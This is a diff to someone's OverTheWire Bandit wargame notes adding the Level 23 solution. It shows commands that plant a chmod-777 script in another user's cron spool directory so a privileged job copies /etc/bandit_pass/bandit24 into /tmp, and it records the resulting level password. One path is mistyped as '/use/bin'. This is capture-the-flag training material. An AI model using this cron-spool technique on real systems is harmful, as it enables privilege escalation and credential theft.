@@ -262,7 +262,17 @@ Level 22:
 
 Level 23:
 	ssh bandit23@bandit.labs.overthewire.org -p 2220
-	
-	Level 24 password: 
+	cat /etc/cron.d/*
+        cat /use/bin/cronjob_bandit24.sh
+        mkdir /tmp/pi23 && cd /tmp/pi23
+        vi discovery.sh
+                #! /bin/bash
+                cat /etc/bandit_pass/bandit24 > /tmp/pi23/password
+        touch password
+        chmod 777 discovery.sh password
+        cp discovery.sh /var/spool/bandit24
+        # wait about 60 seconds
+        cat password
+	Level 24 password: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
 	
 	
